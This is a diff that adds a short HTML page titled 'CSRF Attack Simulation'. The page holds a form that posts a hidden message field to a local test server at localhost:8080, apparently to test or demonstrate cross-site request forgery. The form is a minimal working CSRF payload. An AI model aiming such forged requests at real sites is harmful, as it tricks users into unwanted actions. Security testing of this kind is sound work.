@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack Simulation</title>
+</head>
+<body>
+<h1>CSRF Attack</h1>
+<form action="http://localhost:8080/message" method="post">
+    <input type="hidden" name="content" value="CSRF Attack Message"/>
+    <button type="submit">Send CSRF Attack</button>
+</form>
+</body>
+</html>
